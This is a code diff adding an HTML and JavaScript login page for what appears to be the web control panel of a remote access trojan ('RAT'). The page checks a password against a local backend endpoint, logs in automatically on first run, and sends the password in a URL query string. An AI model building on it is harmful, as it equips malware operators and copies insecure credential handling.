@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<head>
+    <title>Login to RAT</title>
+</head>
+
+<body>
+    <h1 style="text-align: center;">Login to RAT</h1>
+
+    <div style="text-align: center;">
+        <input type="password" id="pass" placeholder="Insert default password">
+        <p>
+        </p>
+        <button onclick="login()">Login</button>
+    </div>
+</body>
+
+<script>
+    var firstTime = REPLACE;
+    
+    if (firstTime)
+    {
+        fetch('./canAutomatic').then(function (response) {
+            response.text().then(function (returned) {
+                if (returned == 'yes')
+                {
+                    login();
+                }
+            });
+        });
+    }
+    function login()
+    {
+        fetch('./backend/login?upassword=' + document.getElementById('pass').value).then(function (response) {
+            response.text().then(function (returned) {
+                var info = JSON.parse(returned);
+
+                if (info.authenticated)
+                {
+                    window.location.replace('./');
+                }
+                else
+                {
+                    window.alert(info.reason);
+                }
+            });
+        });
+    }
+</script>
